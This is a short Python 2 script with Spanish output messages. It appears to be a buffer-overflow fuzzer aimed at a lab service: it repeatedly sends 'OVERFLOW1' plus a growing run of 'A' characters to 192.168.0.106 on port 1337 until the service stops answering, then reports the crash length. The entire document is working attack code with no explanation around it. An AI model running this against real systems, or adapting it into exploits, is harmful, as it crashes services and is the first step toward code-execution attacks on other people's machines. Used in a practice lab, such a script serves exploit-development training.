#!/usr/bin/python

import socket
import sys
from time import sleep

buffer = "A" * 200

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect(('192.168.0.106',1337))
		s.recv(1024)

		print '[*] Enviando buffer con longitud: ' + str(len(buffer))
		s.send("OVERFLOW1 " + buffer)
		s.close()
		sleep(1)
		buffer=buffer+'A'* 200

	except:
		print '[*] Se produjo un bloqueo en la longitud del buffer: ' + str(len(buffer)-200)
		sys.exit()
